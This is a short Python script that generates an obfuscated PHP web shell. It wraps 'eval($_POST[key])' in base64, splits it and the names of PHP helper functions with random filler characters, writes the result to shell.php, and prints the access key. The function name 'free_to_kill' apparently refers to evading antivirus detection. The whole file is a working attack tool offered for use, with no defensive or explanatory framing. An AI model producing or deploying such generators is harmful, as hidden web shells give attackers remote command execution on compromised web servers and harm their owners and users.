import string
import random
import base64

def confuse_insert(replace_string,i,confusing_characters=""):
    encoded_replace_string = ""
    if confusing_characters=="":
        confusing_characters = ''.join(random.sample(string.ascii_letters+string.digits,i))
    
    while True:
        rand_len = random.randint(1,4)
        if len(replace_string) <= rand_len:
            encoded_replace_string += replace_string[:rand_len]+confusing_characters
            break
        encoded_replace_string += replace_string[:rand_len]+confusing_characters
        replace_string = replace_string[rand_len:]
    return confusing_characters,encoded_replace_string

def free_to_kill():
    replace_function = confuse_insert("str_replace",60)
    decode_function = confuse_insert("base64_decode",50)
    create_function = confuse_insert("create_function",60)

    key = ''.join(random.sample(string.ascii_letters+string.digits,4))
    shell_state = f"eval($_POST['{key}']);"
    encoded_shell_state = str(base64.b64encode(shell_state.encode('utf-8'))).split("'",2)[1]

    tmp_state_one = confuse_insert(encoded_shell_state[:8],50)
    state_one = tmp_state_one[1]
    state_two = confuse_insert(encoded_shell_state[8:16],50,tmp_state_one[0])[1]
    state_three = confuse_insert(encoded_shell_state[16:],50,tmp_state_one[0])[1]

    with open("shell.php","w") as f:
        statement = f"""<?php
$rep = str_replace("{replace_function[0]}","","{replace_function[1]}");
$decode = $rep("{decode_function[0]}","","{decode_function[1]}");
$func = $rep("{create_function[0]}","","{create_function[1]}");
$s1 = "{state_one}";
$s2 = "{state_two}";
$s3 = "{state_three}";
$ttk = $func("",$decode($rep("{tmp_state_one[0]}","",$s1.$s2.$s3)));
$ttk();
?>"""
        f.write(statement)
    print("\033[32m[+] Generate shell.php successfully!\033[0m")
    print(f"\033[32m[+] shell_key={key}\033[0m")

free_to_kill()